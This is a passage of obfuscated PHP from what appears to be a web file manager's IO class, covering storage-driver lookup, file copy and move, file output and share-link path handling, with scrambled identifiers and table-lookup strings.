array_merge(array($íÍõõŒ¾[1151] . $©·ÎŞ¡Ğ . $íÍõõŒ¾[128]), $°šÔ¯©ê, array_values($ë ©¬Æİ)); $Ë–™ëÅ¿ = implode($íÍõõŒ¾[81] . PHP_EOL, $Ë–™ëÅ¿) . $íÍõõŒ¾[81]; if ($ƒÛ‚”Œ && $ƒÛ‚”Œ == $íÍõõŒ¾[23]) { return $Ë–™ëÅ¿; } $Ô˜Ôä€§ = array(); $¾ÆŒ°Ü = array($íÍõõŒ¾[1143] => $íÍõõŒ¾[1156], $íÍõõŒ¾[353] => $íÍõõŒ¾[1157]); $€²ßÇßä = $íÍõõŒ¾[12]; foreach ($ßÎÌè¹Ã as $éÊùûØÈ) { if ($éÊùûØÈ[$íÍõõŒ¾[67]] == $íÍõõŒ¾[98]) { $€²ßÇßä = $éÊùûØÈ[$íÍõõŒ¾[42]]; } $š¦Õë© = array($íÍõõŒ¾[423] . $éÊùûØÈ[$íÍõõŒ¾[42]] . $íÍõõŒ¾[423], isset($¾ÆŒ°Ü[$éÊùûØÈ[$íÍõõŒ¾[43]]]) ? $¾ÆŒ°Ü[$éÊùûØÈ[$íÍõõŒ¾[43]]] : $éÊùûØÈ[$íÍõõŒ¾[43]], $éÊùûØÈ[$íÍõõŒ¾[45]] == $íÍõõŒ¾[98] ? $íÍõõŒ¾[1148] : $íÍõõŒ¾[1158] . $éÊùûØÈ[$íÍõõŒ¾[66]], $éÊùûØÈ[$íÍõõŒ¾[67]] == $íÍõõŒ¾[98] ? $íÍõõŒ¾[1159] : $íÍõõŒ¾[12]); $Ô˜Ôä€§[] = trim(implode($íÍõõŒ¾[63], $š¦Õë©)); } foreach ($ë ©¬Æİ as $…í•˜¸³ => $—…ŠîĞƒ) { $øŠå¥ëä = str_replace($íÍõõŒ¾[1160] . $©·ÎŞ¡Ğ . $íÍõõŒ¾[11], $íÍõõŒ¾[12], $…í•˜¸³); $Âééï‰¹ = str_replace(array($íÍõõŒ¾[128], $íÍõõŒ¾[982]), $íÍõõŒ¾[423], substr($—…ŠîĞƒ, stripos($—…ŠîĞƒ, $íÍõõŒ¾[298]))); if ($øŠå¥ëä == $íÍõõŒ¾[1137]) { $ØóÙ³Ëè = $íÍõõŒ¾[1161] . $€²ßÇßä . $íÍõõŒ¾[1162]; } else { $ØóÙ³Ëè = (stripos($øŠå¥ëä, $íÍõõŒ¾[11]) ? $íÍõõŒ¾[1163] : $íÍõõŒ¾[12]) . ($íÍõõŒ¾[1164] . $øŠå¥ëä . $íÍõõŒ¾[1165] . $Âééï‰¹); } $Ô˜Ôä€§[] = $ØóÙ³Ëè; } $ã®Õ¸â = array($íÍõõŒ¾[1166] . $©·ÎŞ¡Ğ . $íÍõõŒ¾[1167], $íÍõõŒ¾[1168] . $©·ÎŞ¡Ğ . $íÍõõŒ¾[1169], implode($íÍõõŒ¾[60] . PHP_EOL, $Ô˜Ôä€§), $íÍõõŒ¾[1170]); $óÈíÚš¶ = implode(PHP_EOL, $ã®Õ¸â); if ($ƒÛ‚”Œ && $ƒÛ‚”Œ == $íÍõõŒ¾[832]) { return $óÈíÚš¶; } $Ç£³£şò = array($íÍõõŒ¾[832] => $óÈíÚš¶, $íÍõõŒ¾[23] => $Ë–™ëÅ¿); return $ƒÛ‚”Œ ? $Ç£³£şò[$ƒÛ‚”Œ] : $Ç£³£şò; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($§º±Š’—, $ôÌ›Äšó) { $µ¦Ëğšİ =& $_SERVER[ªÏ§Ë·]; $ıÜİÂù = $ôÌ›Äšó; $GLOBALS[$µ¦Ëğšİ[1171]] = $µ¦Ëğšİ[1172] . $§º±Š’—; Hook::trigger($µ¦Ëğšİ[1172] . $§º±Š’— . $µ¦Ëğšİ[1173], $ıÜİÂù); $ˆô¶À = self::driverMake($ôÌ›Äšó[0]); if (!$ˆô¶À) { return !1; } if (method_exists($ˆô¶À, $§º±Š’—)) { $ÍöÅŒı = @call_user_func_array(array($ˆô¶À, $§º±Š’—), $ôÌ›Äšó); } else { if (method_exists($ˆô¶À, $µ¦Ëğšİ[1174])) { $ÍöÅŒı = @call_user_func_array(array($ˆô¶À, $§º±Š’—), $ôÌ›Äšó); } else { if (method_exists(self, $§º±Š’—)) { $ÍöÅŒı = @call_user_func_array(array(self, $§º±Š’—), $ôÌ›Äšó); } else { $ÍöÅŒı = call_user_func_array(array(parent, $§º±Š’—), $ôÌ›Äšó); } } } Hook::trigger($µ¦Ëğšİ[1172] . $§º±Š’— . $µ¦Ëğšİ[1175], $ıÜİÂù, $ÍöÅŒı); return $ÍöÅŒı; } public static function init($¼º‚ËéÈ) { return self::driverMake($¼º‚ËéÈ); } public static function copy($€¼ïÔ…ı, $½ÙÜ„ş‚, $æ¡ŸÑà§ = false, $ÏêùÑÃ® = false) { return self::copyMoveStart($€¼ïÔ…ı, $½ÙÜ„ş‚, $æ¡ŸÑà§, $_SERVER[ªÏ§Ë·][584], $ÏêùÑÃ®); } public static function move($ûÊï…€Ü, $ÇÃÛ¹î­, $¬ÙÔş­õ = false, $ÓÆ—Â„ = false) { return self::copyMoveStart($ûÊï…€Ü, $ÇÃÛ¹î­, $¬ÙÔş­õ, $_SERVER[ªÏ§Ë·][586], $ÓÆ—Â„); } private static function copyMoveStart($İæşŒ®Š, $Ò×÷Û, $Ğğ²·ÂÔ, $Õı˜ß¹Ó, $úå½‡Ì) { $æ†ÖÊÆÔ =& $_SERVER[ªÏ§Ë·]; $¡Æ¯Í±œ = array($İæşŒ®Š, $Ò×÷Û, $Ğğ²·ÂÔ, $úå½‡Ì); Hook::trigger($æ†ÖÊÆÔ[1172] . $Õı˜ß¹Ó . $æ†ÖÊÆÔ[1173], $¡Æ¯Í±œ); $””™şş = self::copyMove($İæşŒ®Š, $Ò×÷Û, $Ğğ²·ÂÔ, $Õı˜ß¹Ó, $úå½‡Ì); Hook::trigger($æ†ÖÊÆÔ[1172] . $Õı˜ß¹Ó . $æ†ÖÊÆÔ[1175], $¡Æ¯Í±œ, $””™şş); return $””™şş; } public static function saveFile($øûÎù€Ê, $á”¤»Ñ, $š…Ä¥à¥ = true) { $¯Ù²‡™¸ =& $_SERVER[ªÏ§Ë·]; $’ô†¹â© = self::info($á”¤»Ñ); $èğ€˜ñ– = self::driverMake($øûÎù€Ê); $–ò õË… = self::driverMake($á”¤»Ñ); $åœÆœü = !1; if ($–ò õË…->pathParse[$¯Ù²‡™¸[1176]]) { $åœÆœü = $–ò õË…; $ïÒ¦İû¢ = $–ò õË…->pathParse[$¯Ù²‡™¸[1176]]; $–ò õË… = self::driverMake($ïÒ¦İû¢); } if ($èğ€˜ñ–->pathParse[$¯Ù²‡™¸[1176]]) { $š«¬‡öè = $èğ€˜ñ–->pathParse[$¯Ù²‡™¸[1176]]; $èğ€˜ñ– = self::driverMake($š«¬‡öè); } $òÀñï«¦ = $–ò õË…->pathFather($á”¤»Ñ); $İ ®îÅÎ = !0; if (!$š…Ä¥à¥ && self::driverIsSame($èğ€˜ñ–, $–ò õË…)) { $İ ®îÅÎ = !1; } $ÚŠî’¹ó = self::copyFile($èğ€˜ñ–, $øûÎù€Ê, $–ò õË…, $òÀñï«¦, $’ô†¹â©[$¯Ù²‡™¸[42]], $İ ®îÅÎ); if ($åœÆœü) { $ÚŠî’¹ó = $åœÆœü->getPathOuter($ÚŠî’¹ó); } return $ÚŠî’¹ó; } private static function copyMove($…¾½¸ã , $³èÖÃ, $¨©Ú“ÔŠ, $ë‚øõŞí, $‚ãÂÒ¶ù = false) { $š¤Î…€Ç =& $_SERVER[ªÏ§Ë·]; if (!$…¾½¸ã  || $…¾½¸ã  == $š¤Î…€Ç[8] || !$³èÖÃ) { return !1; } ignore_timeout(); $Ùùü±ºİ = self::driverMake($…¾½¸ã ); $éâ® ÛÁ = self::driverMake($³èÖÃ); $œ¼¢êÙÙ = $ë‚øõŞí == $š¤Î…€Ç[586]; $×¹ãæĞ = !1; if ($éâ® ÛÁ->pathParse[$š¤Î…€Ç[1176]]) { $×¹ãæĞ = $éâ® ÛÁ; $³èÖÃ = $éâ® ÛÁ->pathParse[$š¤Î…€Ç[1176]]; $éâ® ÛÁ = self::driverMake($³èÖÃ); } if ($Ùùü±ºİ->pathParse[$š¤Î…€Ç[1176]]) { $…¾½¸ã  = $Ùùü±ºİ->pathParse[$š¤Î…€Ç[1176]]; $Ùùü±ºİ = self::driverMake($…¾½¸ã ); } self::check($Ùùü±ºİ, $…¾½¸ã , $éâ® ÛÁ, $³èÖÃ); Hook::trigger($š¤Î…€Ç[1177], $Ùùü±ºİ, $…¾½¸ã , $éâ® ÛÁ, $³èÖÃ); $îªÊß†¢ = self::driverIsSame($Ùùü±ºİ, $éâ® ÛÁ); if ($îªÊß†¢) { if ($ë‚øõŞí == $š¤Î…€Ç[586] && !method_exists($éâ® ÛÁ, $š¤Î…€Ç[1178]) && trim($³èÖÃ, $š¤Î…€Ç[8]) == trim($éâ® ÛÁ->pathFather($…¾½¸ã ), $š¤Î…€Ç[8])) { if ($Ùùü±ºİ->pathThis($…¾½¸ã ) != $‚ãÂÒ¶ù && !$Ùùü±ºİ->isTypeObject()) { return $Ùùü±ºİ->rename($…¾½¸ã , $‚ãÂÒ¶ù); } return $éâ® ÛÁ->getPathOuter($…¾½¸ã ); } if (method_exists($éâ® ÛÁ, $ë‚øõŞí)) { return $éâ® ÛÁ->{$ë‚øõŞí}($…¾½¸ã , $³èÖÃ, $¨©Ú“ÔŠ, $‚ãÂÒ¶ù); } } if ($îªÊß†¢ && $ë‚øõŞí == $š¤Î…€Ç[586] && $éâ® ÛÁ->getType() == $š¤Î…€Ç[116]) { $äá ˆ± = $éâ® ÛÁ->movePath($…¾½¸ã , $³èÖÃ, $‚ãÂÒ¶ù); if ($äá ˆ±) { return $äá ˆ±; } } $ë¹³Ö ä = $Ùùü±ºİ->isFile($…¾½¸ã ); if (!$ë¹³Ö ä && $éâ® ÛÁ->getType() == $š¤Î…€Ç[785] && $Ùùü±ºİ->getType() == $š¤Î…€Ç[116]) { $äá ˆ± = $éâ® ÛÁ->copyFolderFromIO($Ùùü±ºİ, $…¾½¸ã , $³èÖÃ, $¨©Ú“ÔŠ, $œ¼¢êÙÙ, $‚ãÂÒ¶ù); } else { $äá ˆ± = self::copyPath($Ùùü±ºİ, $…¾½¸ã , $éâ® ÛÁ, $³èÖÃ, $¨©Ú“ÔŠ, $œ¼¢êÙÙ, $ë¹³Ö ä, $‚ãÂÒ¶ù); } if ($äá ˆ± && $œ¼¢êÙÙ) { $Ùùü±ºİ->remove($…¾½¸ã ); } if ($×¹ãæĞ) { $äá ˆ± = $×¹ãæĞ->getPathOuter($äá ˆ±); } return $äá ˆ±; } private static function check($¤”¾óÍ•, $õÌÆø‘, $øì±™‡˜, &$æÊù¿åâ) { $–×êÂà¿ =& $_SERVER[ªÏ§Ë·]; if (self::driverIsSame($¤”¾óÍ•, $øì±™‡˜) && $¤”¾óÍ•->isFolder($õÌÆø‘) && $¤”¾óÍ•->isParentOf($õÌÆø‘, $æÊù¿åâ)) { show_json(LNG($–×êÂà¿[1179]), !1); } if (!$¤”¾óÍ•->exist($õÌÆø‘)) { show_json(LNG($–×êÂà¿[115]), !1); } } private static function copyPath($±¬ºğ, $„çÖ–ú, $ˆÖìª‹, $å²ñà‘®, $’¤ÃÍú, $ùîëÄ²Ê, $Ö°¹€¥, $ä´Áû‡€ = false, $ô–ä™âì = true) { $™Œ•˜Œí =& $_SERVER[ªÏ§Ë·]; $ÉÏ…úŒ× = empty($ä´Áû‡€) && $ä´Áû‡€ !== $™Œ•˜Œí[208] ? $±¬ºğ->pathThis($„çÖ–ú) : $ä´Áû‡€; if ($’¤ÃÍú) { $‡¯¯ÈåŒ = $ˆÖìª‹->fileNameExist($å²ñà‘®, $ÉÏ…úŒ×); $…ÇÕ±Î– = $ÉÏ…úŒ×; $ÉÏ…úŒ× = $ˆÖìª‹->fileNameAuto($å²ñà‘®, $ÉÏ…úŒ×, $’¤ÃÍú, !$Ö°¹€¥); if (!$‡¯¯ÈåŒ || $…ÇÕ±Î– != $ÉÏ…úŒ×) { $’¤ÃÍú = !1; } if ($ô–ä™âì && !$’¤ÃÍú) { $ˆÖìª‹->_data[$™Œ•˜Œí[1180]] = !0; } } if ($Ö°¹€¥) { return self::copyFile($±¬ºğ, $„çÖ–ú, $ˆÖìª‹, $å²ñà‘®, $ÉÏ…úŒ×, $ùîëÄ²Ê); } if ($’¤ÃÍú == REPEAT_RENAME_FOLDER) { $’¤ÃÍú = !1; } $®°ÅåÜ¤ = rtrim($å²ñà‘®, $™Œ•˜Œí[8]) . $™Œ•˜Œí[8] . $ÉÏ…úŒ×; $öù˜Ö¢ = $ˆÖìª‹->mkdir($ˆÖìª‹->getPath($®°ÅåÜ¤), $’¤ÃÍú); $å²ñà‘® = $ˆÖìª‹->getPathInner($öù˜Ö¢); $¤ÉÙ…³ = $±¬ºğ->listPath($„çÖ–ú, !0); $¤ÉÙ…³ = is_array($¤ÉÙ…³) ? $¤ÉÙ…³ : array($™Œ•˜Œí[93] => array(), $™Œ•˜Œí[92] => array()); $¯Ü´‡Áò = array_merge($¤ÉÙ…³[$™Œ•˜Œí[93]], $¤ÉÙ…³[$™Œ•˜Œí[92]]); foreach ($¯Ü´‡Áò as $‰ŸÄÀ¯) { $¾…¹â‹ñ = $‰ŸÄÀ¯[$™Œ•˜Œí[43]] == $™Œ•˜Œí[210]; $„çÖ–ú = $±¬ºğ->getPathInner($‰ŸÄÀ¯[$™Œ•˜Œí[94]]); $·ŒÜê’¢ = self::copyPath($±¬ºğ, $„çÖ–ú, $ˆÖìª‹, $å²ñà‘®, $’¤ÃÍú, $ùîëÄ²Ê, $¾…¹â‹ñ, !1, !1); if (!$·ŒÜê’¢) { IO::errorTips($™Œ•˜Œí[1181] . $„çÖ–ú . $™Œ•˜Œí[80] . $å²ñà‘®); } } self::copyMoveKeepInfo($±¬ºğ, $„çÖ–ú, $öù˜Ö¢); return $öù˜Ö¢; } private static function copyFile($‹›Óİ¬‡, $¸Ë¦Í, $é…ä», $³Ÿ¦ºØš, $Ô“éğ‚, $õºˆªÙ„) { $‰¦÷ÖÖÆ =& $_SERVER[ªÏ§Ë·]; $³Ÿ¦ºØš = $é…ä»->getPath(rtrim($³Ÿ¦ºØš, $‰¦÷ÖÖÆ[8]) . $‰¦÷ÖÖÆ[8] . $Ô“éğ‚); $‹ØƒØî¤ = $‰¦÷ÖÖÆ[1182] . time() . rand_string(5); Hook::trigger($‰¦÷ÖÖÆ[1183], $‹›Óİ¬‡, $¸Ë¦Í, $é…ä», $³Ÿ¦ºØš, $Ô“éğ‚, $‹ØƒØî¤); if (self::driverIsSame($‹›Óİ¬‡, $é…ä»)) { if ($õºˆªÙ„) { $«ÜåÜˆ = $é…ä»->moveFile($¸Ë¦Í, $³Ÿ¦ºØš); } else { $«ÜåÜˆ = $é…ä»->copyFile($¸Ë¦Í, $³Ÿ¦ºØš); } Hook::trigger($‰¦÷ÖÖÆ[1184], $‹›Óİ¬‡, $¸Ë¦Í, $é…ä», $³Ÿ¦ºØš, $Ô“éğ‚, $«ÜåÜˆ); self::copyMoveKeepInfo($‹›Óİ¬‡, $¸Ë¦Í, $«ÜåÜˆ); return $«ÜåÜˆ; } $ŠÑ¯ŸË” = TEMP_FILES; if ($GLOBALS[$‰¦÷ÖÖÆ[6]][$‰¦÷ÖÖÆ[99]][$‰¦÷ÖÖÆ[824]]) { $ŠÑ¯ŸË” = $GLOBALS[$‰¦÷ÖÖÆ[6]][$‰¦÷ÖÖÆ[99]][$‰¦÷ÖÖÆ[824]]; } $û›¹ìïÊ = $ŠÑ¯ŸË”; mk_dir($û›¹ìïÊ); $ß‰•©«â = $û›¹ìïÊ . $‹ØƒØî¤; $Ãñ à¦ö = $ß‰•©«â; $ß‰•©«â = $‹›Óİ¬‡->download($¸Ë¦Í, $ß‰•©«â); $ß‰•©«â = $‹›Óİ¬‡->iconvApp($ß‰•©«â); if (substr($ß‰•©«â, strlen($ŠÑ¯ŸË”)) == $ŠÑ¯ŸË”) { $õºˆªÙ„ = !0; } $«ÜåÜˆ = $é…ä»->upload($³Ÿ¦ºØš, $ß‰•©«â, $õºˆªÙ„); self::remove($Ãñ à¦ö); Hook::trigger($‰¦÷ÖÖÆ[1184], $‹›Óİ¬‡, $¸Ë¦Í, $é…ä», $³Ÿ¦ºØš, $Ô“éğ‚, $«ÜåÜˆ); self::copyMoveKeepInfo($‹›Óİ¬‡, $¸Ë¦Í, $«ÜåÜˆ); return $«ÜåÜˆ; } private static function copyMoveKeepInfo($É˜’µï, $„Àƒêî, $Æ†ı÷ŸÊ) { if (!$Æ†ı÷ŸÊ) { return; } $Œ›İƒº„ = $É˜’µï->info($„Àƒêî); if (!is_array($Œ›İƒº„)) { return; } IO::setModifyTime($Æ†ı÷ŸÊ, $Œ›İƒº„[$_SERVER[ªÏ§Ë·][95]]); } public static function pathFather($–şµŒï…) { $èÙßáˆª = IO::init($–şµŒï…); $¿í‚àÚ = $èÙßáˆª->pathFather($èÙßáˆª->path); return $èÙßáˆª->getPathOuter($¿í‚àÚ); } public static function fileOut($Äé†²‰Û, $‚¸ë‘’ = false, $÷Èıé¬ = false, $…èŞô’é = '') { $Ò‡‰„Ì« = self::driverMake($Äé†²‰Û); if ($Ò‡‰„Ì«->isFileOutServer()) { return $Ò‡‰„Ì«->fileOutServer($Äé†²‰Û, $‚¸ë‘’, $÷Èıé¬, $…èŞô’é); } return $Ò‡‰„Ì«->fileOut($Äé†²‰Û, $‚¸ë‘’, $÷Èıé¬, $…èŞô’é); } public static function fileOutImage($…²ıºã, $¿ŞüÉø’ = 250) { $Ò¯Û‡¹¼ = array(250, 600, 1200, 2000, 3000, 5000); for ($ëÂÉËÑÍ = 0; $ëÂÉËÑÍ < count($Ò¯Û‡¹¼); $ëÂÉËÑÍ++) { if ($ëÂÉËÑÍ == 0 && $¿ŞüÉø’ <= $Ò¯Û‡¹¼[$ëÂÉËÑÍ]) { $¿ŞüÉø’ = $Ò¯Û‡¹¼[$ëÂÉËÑÍ]; break; } else { if ($¿ŞüÉø’ > $Ò¯Û‡¹¼[$ëÂÉËÑÍ - 1] && $¿ŞüÉø’ <= $Ò¯Û‡¹¼[$ëÂÉËÑÍ]) { $¿ŞüÉø’ = $Ò¯Û‡¹¼[$ëÂÉËÑÍ]; break; } else { if ($ëÂÉËÑÍ == count($Ò¯Û‡¹¼) - 1 && $¿ŞüÉø’ > $Ò¯Û‡¹¼[$ëÂÉËÑÍ]) { $¿ŞüÉø’ = $Ò¯Û‡¹¼[$ëÂÉËÑÍ]; break; } } } } $¯Êİ¤¿é = self::driverMake($…²ıºã); if ($¯Êİ¤¿é->isFileOutServer()) { return $¯Êİ¤¿é->fileOutImageServer($…²ıºã, $¿ŞüÉø’); } return $¯Êİ¤¿é->fileOutImage($…²ıºã, $¿ŞüÉø’); } private static function driverIsSame($ÀïÒÜí, $„Ùï«¶¬) { $øç‡òÚ =& $_SERVER[ªÏ§Ë·]; $»¸Öé¶¬ = $ÀïÒÜí->getType(); $öô„òù = $„Ùï«¶¬->getType(); if ($»¸Öé¶¬ != $öô„òù) { return !1; } if ($»¸Öé¶¬ == $øç‡òÚ[785]) { return !0; } if ($»¸Öé¶¬ == $øç‡òÚ[116]) { return !0; } if ($ÀïÒÜí->pathDriver == $„Ùï«¶¬->pathDriver) { return !0; } return !1; } public static function copyUpdate($èêÕüø©, $Ñ«Š€ê³) { $òõòßÓƒ =& $_SERVER[ªÏ§Ë·]; if (!IO::exist($èêÕüø©)) { return !1; } if (!IO::exist($Ñ«Š€ê³)) { IO::mkdir($Ñ«Š€ê³); } $·Œ÷ˆÇç = array_to_keyvalue(self::listAllSimple($èêÕüø©), $òõòßÓƒ[94]); $İÏÍæ = array_to_keyvalue(self::listAllSimple($Ñ«Š€ê³), $òõòßÓƒ[94]); $ú»¸¡İü = array(); $Ş¶¿ú¡ = array(); foreach ($·Œ÷ˆÇç as $¶™ıíÉÔ => $åÁ…Ú°è) { if (isset($İÏÍæ[$¶™ıíÉÔ])) { if ($åÁ…Ú°è[$òõòßÓƒ[85]] == 1) { continue; } if ($İÏÍæ[$¶™ıíÉÔ][$òõòßÓƒ[86]] == $åÁ…Ú°è[$òõòßÓƒ[86]]) { continue; } } if ($åÁ…Ú°è[$òõòßÓƒ[85]] == 1) { $Ş¶¿ú¡[] = $Ñ«Š€ê³ . $òõòßÓƒ[8] . trim($¶™ıíÉÔ, $òõòßÓƒ[8]); continue; } $¦ø‘ïÁõ = strstr(trim($¶™ıíÉÔ, $òõòßÓƒ[8]), $òõòßÓƒ[8]) ? get_path_father($¶™ıíÉÔ) : $òõòßÓƒ[12]; $ú»¸¡İü[] = array($òõòßÓƒ[1185] => $åÁ…Ú°è[$òõòßÓƒ[96]], $òõòßÓƒ[1186] => rtrim($Ñ«Š€ê³, $òõòßÓƒ[8]) . $òõòßÓƒ[8] . $¦ø‘ïÁõ, $òõòßÓƒ[1187] => $åÁ…Ú°è); } $ÊØ¾áâ = array($òõòßÓƒ[210] => $ú»¸¡İü, $òõòßÓƒ[85] => $Ş¶¿ú¡); Hook::trigger($òõòßÓƒ[1188], $èêÕüø©, $Ñ«Š€ê³, $ÊØ¾áâ); foreach ($Ş¶¿ú¡ as $åÁ…Ú°è) { IO::mkdir($åÁ…Ú°è); } foreach ($ú»¸¡İü as $åÁ…Ú°è) { IO::copy($åÁ…Ú°è[$òõòßÓƒ[1185]], $åÁ…Ú°è[$òõòßÓƒ[1186]], REPEAT_REPLACE); } } public static function fileSubstr($Ç¿şœÙç, $ç¦íµĞÍ, $‹§¥ÃŒš = false) { $ı¥Ì©Æ =& $_SERVER[ªÏ§Ë·]; $Ş²û§ØÁ = self::driverMake($Ç¿şœÙç); $¢¨Ç¸İË = $Ş²û§ØÁ->size($Ç¿şœÙç); $èè˜ƒ = $ç¦íµĞÍ; $À¦“éƒ¢ = $‹§¥ÃŒš; if ($ç¦íµĞÍ < 0) { $ç¦íµĞÍ = $¢¨Ç¸İË + $ç¦íµĞÍ; } if ($‹§¥ÃŒš === !1) { $‹§¥ÃŒš = $¢¨Ç¸İË - $ç¦íµĞÍ; } if ($ç¦íµĞÍ + $‹§¥ÃŒš > $¢¨Ç¸İË) { $‹§¥ÃŒš = $¢¨Ç¸İË - $ç¦íµĞÍ; } if (!$¢¨Ç¸İË && $Ş²û§ØÁ->getType() == $ı¥Ì©Æ[116] && !$Ş²û§ØÁ->exist($Ç¿şœÙç)) { $ºéœ·à– = get_path_this($Ç¿şœÙç); $Ã‘Ò¸ = parse_url_query($ºéœ·à–); if (is_array($Ã‘Ò¸) && isset($Ã‘Ò¸[$ı¥Ì©Æ[42]])) { $ºéœ·à– = urldecode($Ã‘Ò¸[$ı¥Ì©Æ[42]]); } throw new Exception($ı¥Ì©Æ[1189] . LNG($ı¥Ì©Æ[1190]) . $ı¥Ì©Æ[991] . clear_html($ºéœ·à–) . $ı¥Ì©Æ[12]); } if ($‹§¥ÃŒš <= 0) { return $ı¥Ì©Æ[12]; } if ($ç¦íµĞÍ < 0 || $ç¦íµĞÍ >= $¢¨Ç¸İË || $‹§¥ÃŒš > 1024 * 1024 * 10) { throw new Exception("\146\x69\x6c\145\122\x65\x61\144\x20\x65\x72\162\157\x72\x21\40\x73\164\141\162\164\x3d{$ç¦íµĞÍ}\73\x6c\145\x6e\147\x74\x68\75{$‹§¥ÃŒš}\x3b\x20\163\x69\172\x65\x3d{$¢¨Ç¸İË}\x3b"); } $ƒ¸Ä¢õ = $Ş²û§ØÁ->fileSubstr($Ç¿şœÙç, $ç¦íµĞÍ, $‹§¥ÃŒš); if (!$ƒ¸Ä¢õ && $‹§¥ÃŒš && isset($GLOBALS[$ı¥Ì©Æ[1191]])) { throw new Exception($GLOBALS[$ı¥Ì©Æ[1191]][$ı¥Ì©Æ[1192]]); } return $ƒ¸Ä¢õ; } private static function driverMake(&$‚ÌàŸ¾) { $ŞöƒÂ½‰ =& $_SERVER[ªÏ§Ë·]; $èî°Úİ– = KodIO::parse($‚ÌàŸ¾); if (!self::$driverListSystem) { $øøóòüˆ = Model($ŞöƒÂ½‰[795])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($øøóòüˆ, $ŞöƒÂ½‰[437]); } if ($èî°Úİ–[$ŞöƒÂ½‰[43]] == KodIO::KOD_IO && !self::$driverListSystem[$èî°Úİ–[$ŞöƒÂ½‰[437]]]) { return !1; } $‚ÌàŸ¾ = $èî°Úİ–[$ŞöƒÂ½‰[1193]]; $¸×ı£Èá = self::driverGet($èî°Úİ–, $‚ÌàŸ¾); return $¸×ı£Èá; } private static function driverGet($­å…óÁ€, &$ˆ»ƒÒœ–) { $Îñé‰–Ç =& $_SERVER[ªÏ§Ë·]; $µøäıÛô = $­å…óÁ€[$Îñé‰–Ç[1194]]; $ËÉü²¸ = $­å…óÁ€[$Îñé‰–Ç[437]]; switch ($­å…óÁ€[$Îñé‰–Ç[43]]) { case KodIO::KOD_IO: $…Ãİ¥É‰ = self::$driverListSystem[$ËÉü²¸]; break; case KodIO::KOD_SOURCE: $ˆ»ƒÒœ– = $ËÉü²¸ . $ˆ»ƒÒœ–; $…Ãİ¥É‰ = array($Îñé‰–Ç[1195] => $Îñé‰–Ç[1196], $Îñé‰–Ç[6] => $­å…óÁ€); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $şÙÈÜî¸ = $GLOBALS[$Îñé‰–Ç[1197]]; self::$driverListUser = array_to_keyvalue($şÙÈÜî¸, $Îñé‰–Ç[437]); } $…Ãİ¥É‰ = self::$driverListUser[$ËÉü²¸]; break; case KodIO::KOD_SHARE_LINK: $…Ãİ¥É‰ = array($Îñé‰–Ç[1195] => $Îñé‰–Ç[1198], $Îñé‰–Ç[6] => $­å…óÁ€); $šê¶é = Action($Îñé‰–Ç[1199])->sharePathInfo($­å…óÁ€[$Îñé‰–Ç[94]]); $ˆ»ƒÒœ– = $šê¶é[$Îñé‰–Ç[440]]; if (!$šê¶é[$Îñé‰–Ç[440]]) { $ø“‚øâ = Model($Îñé‰–Ç[630])->getInfo($šê¶é[$Îñé‰–Ç[631]]); $ˆ»ƒÒœ– = KodIO::clear($ø“‚øâ[$Îñé‰–Ç[1200]] . $­å…óÁ€[$Îñé‰–Ç[1193]]); $­å…óÁ€[$Îñé‰–Ç[524]] = $ø“‚øâ; $­å…óÁ€[$Îñé‰–Ç[1176]] = $ˆ»ƒÒœ–; $…Ãİ¥É‰ = array($Îñé‰–Ç[1195] => $Îñé‰–Ç[1201], $Îñé‰–Ç[6] => $­å…óÁ€); } break; case KodIO::KOD_SHARE_ITEM: $…Ãİ¥É‰ = array($Îñé‰–Ç[1195] => $Îñé‰–Ç[1202], $Îñé‰–Ç[6] => $­å…óÁ€); $ø“‚øâ = Model($Îñé‰–Ç[630])->getInfo($­å…óÁ€[$Îñé‰–Ç[437]]); if ($ø“‚øâ[$Îñé‰–Ç[440]] == $Îñé‰–Ç[208]) { $ˆ»ƒÒœ– = KodIO::clear($ø“‚øâ[$Îñé‰–Ç[1200]] . $­å…óÁ€[$Îñé‰–Ç[1193]]); $­å…óÁ€[$Îñé‰–Ç[524]] = $ø“‚øâ; $­å…óÁ€[$Îñé‰–Ç[1176]] = $ˆ»ƒÒœ–; $…Ãİ¥É‰ = array($Îñé‰–Ç[1195] => $Îñé‰–Ç[1203], $Îñé‰–Ç[6] => $­å…óÁ€); } else { if (!$ˆ»ƒÒœ–) { $ˆ»ƒÒœ– = $ø“‚øâ[$Îñé‰–Ç[440]]; } } break; default: $ˆ»ƒÒœ– = $­å…óÁ€[$Îñé‰–Ç[94]]; $…Ãİ¥É‰ = array($Îñé‰–Ç[1195] => $Îñé‰–Ç[1204]); break; } $ÏëñÆ™’ = $­å…óÁ€[$Îñé‰–Ç[94]]; if (!isset(self::$driverCache[$ÏëñÆ™’])) { $ÃÉˆœ = strtolower($…Ãİ¥É‰[$Îñé‰–Ç[105]]); $èŒÂ¯‹ = $GLOBALS[$Îñé‰–Ç[6]][$Îñé‰–Ç[99]][$Îñé‰–Ç[854]]; $¼Ç¤¤©Ë = $Îñé‰–Ç[84] . (isset($èŒÂ¯‹[$ÃÉˆœ]) ? $èŒÂ¯‹[$ÃÉˆœ] : ucfirst($ÃÉˆœ)); if (!class_exists($¼Ç¤¤©Ë)) { show_json("{$¼Ç¤¤©Ë}\x20\156\x6f\164\40\145\x78\x69\x73\x74\x73\41", !1); } $äŸšÓèÑ = isset($…Ãİ¥É‰[$Îñé‰–Ç[6]]) ? $…Ãİ¥É‰[$Îñé‰–Ç[6]] : !1; self::$driverCache[$ÏëñÆ™’] = new $¼Ç¤¤©Ë($äŸšÓèÑ); } $´ÏÇ‰ôş = self::$driverCache[$ÏëñÆ™’]; $´ÏÇ‰ôş->pathDriver = $µøäıÛô; $´ÏÇ‰ôş->pathBase = $Îñé‰–Ç[12]; if (isset($…Ãİ¥É‰[$Îñé‰–Ç[6]][$Îñé‰–Ç[1205]])) { $´ÏÇ‰ôş->pathBase = rtrim($…Ãİ¥É‰[$Îñé‰–Ç[6]][$Îñé‰–Ç[1205]], $Îñé‰–Ç[8]) . $Îñé‰–Ç[8]; $ˆ»ƒÒœ– = $´ÏÇ‰ôş->pathBase . ltrim($ˆ»ƒÒœ–, $Îñé‰–Ç[8]); } $ˆ»ƒÒœ– = $´ÏÇ‰ôş->getPath($ˆ»ƒÒœ–); if (isset($­å…óÁ€[$Îñé‰–Ç[1176]])) { $ˆ»ƒÒœ– = $­å…óÁ€[$Îñé‰–Ç[1176]]; } $´ÏÇ‰ôş->path = 